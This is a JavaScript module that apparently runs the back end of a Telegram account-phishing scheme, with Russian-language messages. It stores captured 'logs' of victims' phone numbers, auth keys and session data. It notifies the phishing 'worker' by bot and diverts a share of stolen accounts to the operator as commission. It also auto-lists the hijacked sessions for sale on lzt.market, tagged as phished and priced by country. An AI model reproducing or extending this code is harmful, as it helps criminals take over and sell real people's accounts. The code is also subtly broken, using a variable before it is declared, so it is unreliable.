import Log from './database/log.js';
import user from './database/user.js';
import config from '../config.json' assert { type: "json" };
import TelegramBot from 'node-telegram-bot-api';
import axios from 'axios';
import commission from './database/commission.js';
import market from './database/market.js';
import parsePhoneNumber from 'libphonenumber-js'
import lolz from './lolz/index.js';

const bot = new TelegramBot(config.notify, { polling: false });

export default async log => {
    const worker = await user.findOne({ id: log.worker });

    const logsCount = (await Log.find({ 'worker': log.worker })).length;
    const com = (await commission.findOne({}))?.value
    let country = (parsePhoneNumber(log.phone) || parsePhoneNumber("+" + log.phone))?.country?.toLocaleLowerCase();

    if (country === 'by') {
        country = 'br';
    }

    let msg = `*⚡️ Аккаунт *${log.phone}
${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new TelegramBot(log.bot, { polling: false }).getMe().catch(() => { }) || {}).username.replaceAll('_', '\\_')}` : `ℹ️ Добытый с домена ${log.bot}`}`

    worker.com = worker.com || com;
    if (logsCount + 1 === worker.com || (worker.com && (logsCount + 1) % worker.com === 0)) {
        log.bot = 'com';

        if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n*🤝🏻 Был отдан в качестве комиссии*`, {
            parse_mode: 'Markdown'
        })
        const owner = await user.findOne({ id: config.admin });
        worker.lzt = owner.admToken;
        worker.id = owner.id;
        worker.notify = owner.notify;
        worker.lztOn = owner.lztOn;
    }

    const marketSettings = await market.findOne({ 'token': worker.lzt });

    const newLog = await new Log({
        ...log,
        created: Date.now()
    }).save();
    console.log(1);

    if (worker.lztOn && marketSettings) {
        async function send() {
            console.log("Отправляем логи на лолз", log.deviceParams)
            const response = await axios({
                method: 'POST',
                url: 'https://api.lzt.market/item/fast-sell?currency=rub&item_origin=fishing',
                headers: {
                    accept: 'application/json',
                    'content-type': 'application/json',
                    authorization: `Bearer ${worker.lzt}`
                },
                data: {
                    description: marketSettings.bio,
                    login: log.authKey,
                    password: log.dcId,
                    title: marketSettings.name,
                    title_en: marketSettings.nameEn,
                    price: log.premium ? marketSettings.premium : marketSettings[country || 'price'] || marketSettings.price,
                    category_id: 24,
                    extra: {
                        checkSpam: true,
                        telegramClient:
                        {
                            "telegram_api_id": config.apiId,
                            "telegram_api_hash": config.apiHash,
                            "telegram_device_model": log.deviceParams.deviceModel,
                            "telegram_system_version": log.deviceParams.systemVersion,
                            "telegram_app_version": log.deviceParams.appVersion
                        }
                        ,
                        checkChannels: true
                    }
                }
            })
                .catch(error => error.response)

            const error = (response.data?.errors || response.data?.error)?.[0] || (((response?.status || 200) === 200 || response?.status === 502) ? null : 'Технические работы LZT маркета');


            if (!error) {
                const item_id = account?.item_id

                msg += `\n\n*✅ Успешно выложен на лолз LZT(https://lzt.market/${item_id})*`

                const account = response?.data?.item?.items?.[0]
                if (account && (account.telegram_spam_block === -3 || account.telegram_password)) {
                    const price = account.telegram_password == -3 ? marketSettings.pass : marketSettings.spam;
                    await lolz.editPrice(worker.lzt, item_id, price)
                }
                await market.findOneAndUpdate({ id: marketSettings.id }, { $inc: { success: 1 }, $set: { item_id } })
            } else {
                if (error === 'captcha') {
                    console.log('капча');
                    return await send();
                }
                // if (error === 'Too Many Requests') {
                //     setTimeout(async () => {
                //         return await send();
                //     }, 3000);
                // }

                await market.findOneAndUpdate({ id: marketSettings.id }, { $inc: { error: 1 } })
                msg += `\n\n*❗️ Не удалось выложить на лолз*\nОшибка: ${error} (Ошибка на стороне LZT)`;
            }
        }

        await send();
    }

    if (worker.notify) await bot.sendMessage(worker.id, msg, {
        parse_mode: 'Markdown'
    }).catch(console.log);
}